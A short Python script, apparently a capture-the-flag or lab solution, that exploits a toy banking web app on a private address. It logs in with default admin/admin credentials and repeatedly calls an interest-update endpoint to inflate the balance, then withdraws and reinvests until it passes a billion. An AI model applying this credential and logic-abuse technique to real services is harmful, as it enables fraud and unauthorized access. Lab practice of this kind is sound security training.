import requests

url = "http://192.168.192.128:5556/"

sess = requests.Session()
creds = {"username": 'admin', "password": 'admin'}

sess.post(url + 'login/', data = creds) #Входим в учётную запись
sess.post(url + 'invest/', data = {'balance':'100'}) #Открываем вклад на весь баланс клиента

balance = 100

while balance < 1000000000:
    for _ in range(100):
        cont = sess.post(url + 'update_balance/').json() #Ускоряем начисление процентов
    balance = cont["balance"]

    sess.post(url + 'receive/') #Выводим всю сумму
    # Снова открываем вклад на весь баланс клиента
    sess.post(url + 'invest/', data={'balance': balance})

sess.post(url + 'receive/')  # Выводим всю сумму
print("Готово! Вы миллиардер!")
